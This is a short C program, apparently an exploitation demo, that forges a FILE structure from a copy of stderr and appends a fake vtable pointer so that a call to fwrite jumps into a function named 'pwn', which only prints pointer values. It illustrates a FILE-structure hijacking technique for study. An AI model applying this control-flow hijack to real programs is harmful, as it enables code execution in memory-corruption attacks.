#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

void pwn(void* a, void* b, void* c, void* d) {
  printf("%p %p %p %p\n", a,b, c, d);
}

uint64_t funcs[] = {0, 1, 
  2, 
  3, 
  4, 
  5, 
  6, 
  pwn};

int main() {
  FILE* f = stderr;
  
  void* fake = malloc(sizeof(FILE) + 8);
  printf("%p\n", fake);
  memcpy(fake, stderr, sizeof(FILE));
  *(uint64_t*)(fake + sizeof(FILE)) = (uint64_t)funcs;

  fwrite("FFF", 3, 3, fake);

}

